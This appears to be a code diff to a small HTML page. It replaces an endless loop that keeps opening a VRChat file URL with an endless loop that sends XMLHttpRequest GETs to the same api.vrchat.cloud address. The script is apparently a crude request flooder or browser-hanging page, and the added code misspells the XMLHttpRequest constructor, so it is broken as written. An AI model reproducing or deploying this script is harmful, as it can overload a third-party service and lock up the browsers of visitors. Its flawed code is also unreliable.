@@ -3,7 +3,9 @@
     <script>
       while(true)
       {
-        open('https://api.vrchat.cloud/api/1/file/file_d4d85d05-6a44-4801-8e68-9722dacae2a0/2/file');
+        var Http = new XMLHttpRquest();
+        Http.open("GET","https://api.vrchat.cloud/api/1/file/file_d4d85d05-6a44-4801-8e68-9722dacae2a0/2/file");
+        Http.send(null);
       }
     </script>
   </body>
